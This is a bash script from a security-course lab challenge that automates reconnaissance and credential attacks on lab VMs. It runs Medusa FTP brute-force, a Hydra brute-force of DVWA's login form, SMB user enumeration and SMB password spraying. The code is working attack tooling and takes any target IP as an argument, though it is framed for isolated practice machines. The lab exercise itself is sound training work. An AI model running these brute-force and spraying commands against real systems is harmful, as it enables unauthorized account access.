#!/usr/bin/env bash
# Security Lab – DIO Challenge
# Leonardo Costa – Fullstack Developer & Cybersecurity Enthusiast
#
# This script automates the three core attack scenarios proposed in the challenge:
# 1) FTP brute-force (Medusa)
# 2) DVWA web-form brute-force (Hydra)
# 3) SMB password spraying with user enumeration (enum4linux-ng + Medusa)
#
# USAGE (as root on Kali):
#   ./lab-execution.sh <TARGET_IP> [WORDLIST_DIR]
#   WORDLIST_DIR defaults to ./wordlists if omitted
#
# IMPORTANT:
#   - Run ONLY against VMs you own (Metasploitable 2 / DVWA)
#   - All traffic is isolated via VirtualBox Host-Only network
#   - Logs and evidence are saved under ./evidence/<timestamp>/

set -euo pipefail

############## CONFIGURATION ##############
TARGET="${1:-192.168.56.20}"          # Metasploitable 2 example IP
WORDLIST_DIR="${2:-./wordlists}"
DVWA_IP="${DVWA_IP:-192.168.56.30}"   # DVWA VM IP (export if different)
EVIDENCE_DIR="./evidence/$(date +%F_%H-%M-%S)"
LOG="$EVIDENCE_DIR/lab.log"

mkdir -p "$EVIDENCE_DIR"

exec > >(tee -a "$LOG")
exec 2>&1

echo "[*] DIO Security Lab – Leonardo Costa"
echo "[*] Evidence folder: $EVIDENCE_DIR"
echo "[*] Target (Metasploitable): $TARGET  |  DVWA: $DVWA_IP"
echo ""

############## 0. PREREQUISITES ##############
for tool in medusa hydra enum4linux-ng nmap smbclient; do
  command -v "$tool" >/dev/null || { echo "[!] $tool not found – install first"; exit 1; }
done

[ -d "$WORDLIST_DIR" ] || { echo "[!] Wordlist directory missing: $WORDLIST_DIR"; exit 1; }

############## 1. RECON ##############
echo "[*] 1. Port & service discovery"
nmap -sV -O "$TARGET" -oN "$EVIDENCE_DIR/nmap_discover.txt"
nmap -sV -p 21,80,139,445 "$TARGET" -oN "$EVIDENCE_DIR/nmap_quick.txt"
echo ""

############## 2. FTP BRUTE-FORCE ##############
echo "[*] 2. FTP brute-force (Medusa) – vsftpd on 21/tcp"
FTP_USERS=("msfadmin" "user" "admin")
FTP_PASSES="$WORDLIST_DIR/ftp-passwords.txt"

for u in "${FTP_USERS[@]}"; do
  echo "[*] Trying user: $u"
  medusa -h "$TARGET" -u "$u" -P "$FTP_PASSES" -M ftp -n 21 -t 4 -f -v 6 \
    | tee "$EVIDENCE_DIR/medusa_ftp_${u}.txt"
done
echo ""

############## 3. DVWA WEB-FORM BRUTE-FORCE ##############
echo "[*] 3. DVWA brute-force (Hydra) – low security, cookie required"
DVWA_COOKIE="security=low; PHPSESSID=$(curl -s -c - http://$DVWA_IP/dvwa/login.php | awk '/PHPSESSID/{print $7}')"
WEB_PASSES="$WORDLIST_DIR/web-passwords.txt"

hydra -l admin -P "$WEB_PASSES" "$DVWA_IP" \
  http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:Welcome to the password protected area" \
  -H "Cookie: $DVWA_COOKIE" -s 80 -V -f -t 4 \
  | tee "$EVIDENCE_DIR/hydra_dvwa.txt"
echo ""

############## 4. SMB ENUM + PASSWORD SPRAYING ##############
echo "[*] 4. SMB user enumeration (enum4linux-ng)"
enum4linux-ng -A "$TARGET" -oJ "$EVIDENCE_DIR/enum4linux.json" \
  | tee "$EVIDENCE_DIR/enum4linux.txt"

# Build user list from JSON (jq required)
if command -v jq >/dev/null; then
  jq -r '.users[]?.username' "$EVIDENCE_DIR/enum4linux.json" > "$EVIDENCE_DIR/smb_users.txt"
else
  grep -i 'user.*RID' "$EVIDENCE_DIR/enum4linux.txt" | awk '{print $1}' > "$EVIDENCE_DIR/smb_users.txt"
fi

SPRAY_PASSES="$WORDLIST_DIR/spray.txt"
[ -s "$EVIDENCE_DIR/smb_users.txt" ] || echo "msfadmin" > "$EVIDENCE_DIR/smb_users.txt"

echo "[*] 4b. SMB password spraying (Medusa – smbnt)"
medusa -h "$TARGET" -U "$EVIDENCE_DIR/smb_users.txt" -P "$SPRAY_PASSES" \
  -M smbnt -t 4 -f -v 6 \
  | tee "$EVIDENCE_DIR/medusa_smb_spray.txt"
echo ""

############## 5. VALIDATION ##############
echo "[*] 5. Quick validation (manual)"
echo "    FTP:  ftp $TARGET  (user: msfadmin  pass: <from medusa_ftp_*.txt>)"
echo "    SMB:  smbclient -L //${TARGET}/ -U <user>%<pass>"
echo "    DVWA: browse http://${DVWA_IP}/dvwa and login with cracked creds"
echo ""

############## 6. CLEANUP & SUMMARY ##############
echo "[*] 6. Evidence collected"
ls -lh "$EVIDENCE_DIR"
echo ""
echo "[*] Lab complete – review logs under $EVIDENCE_DIR"